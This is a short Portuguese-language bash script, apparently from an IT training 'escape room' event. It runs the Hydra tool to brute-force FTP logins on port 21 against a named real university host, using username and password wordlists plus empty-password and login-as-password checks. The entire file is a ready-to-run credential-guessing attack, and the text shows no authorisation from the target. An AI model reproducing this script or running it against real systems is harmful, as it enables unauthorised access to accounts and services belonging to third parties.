#!/bin/bash
# Autor: Robson Vaamonde
# Site: www.procedimentosemti.com.br
# Facebook: facebook.com/ProcedimentosEmTI
# Facebook: facebook.com/BoraParaPratica
# YouTube: youtube.com/BoraParaPratica
# Data de criação: 31/10/2016
# Data de atualização: 05/06/2017
# Versão: 1.1

#Comandos utilizados no #Escape_Room_TI_SENAC_Tatuapé_30_Anos

#Variável do comando Hydra
ALVO="www.uninove.br"
USERNAME="usuarios.txt"
WORDLIST="senhas.txt"
PORT="21"
SERVICE="ftp"

#Executando o comando Hydra com a opções: -s=Porta, -e=Checagens Adcionais, -f=Após confirmação de Login, sair do acesso, 
#-vV=Modo Verboso, detalhado na hora de passar usuário e senhas, -L=Wordlist de Usuários, -P=Wordlist de senhas, -t=Tarefas/Tentativas
#Informações levantadas utilizando o comando Nmap
echo -e "Executando o comando Hydra no alvo: $ALVO"
echo
hydra -f -s $PORT -t 5 -vV -f -L $USERNAME -e ns -P $WORDLIST $ALVO $SERVICE
echo
echo -e "Fim da execução `date`"
